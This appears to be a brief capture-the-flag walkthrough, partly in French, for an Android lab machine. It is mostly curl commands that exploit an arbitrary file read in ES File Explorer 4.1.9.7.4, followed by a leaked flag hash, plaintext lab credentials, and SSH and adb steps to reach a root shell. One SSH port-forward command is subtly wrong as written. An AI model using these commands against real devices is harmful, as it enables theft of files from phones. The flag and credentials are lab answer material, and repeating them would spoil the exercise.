#android

#ip  10.10.10.247

Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read

flag user : 

 curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/

ou

curl --header "Content-Type: application/json" --request POST --data '{"command":"listFiles"}' http://10.10.10.247:59777/sdcard/  

puis 

 curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"getFiles\"}" http://10.10.10.247:59777/sdcard/user.txt

ou

curl --header "Content-Type: application/json" --request POST --data '{"command":"getFiles"}' http://10.10.10.247:59777/sdcard/user.txt  

hash :  f32017174c7c7e8f50c6da52891ae250

flag root :

curl --header "Content-Type: application/json" --request POST --data '{"command":"getFiles"}' http://10.10.10.247:59777/sdcard/DCIM/creds.jpg --output login.jpg

user : kristi
pass :  Kr1sT!5h@Rp3xPl0r3!

connection ssh :

ssh -l 5555:localhost:5555 kristi@10.10.10.247 -p 2222

adb connect localhost:5555

adb -s localhost:5555 shell

grep -ri "root.txt"

cd /data

ls -la

cat root.txt
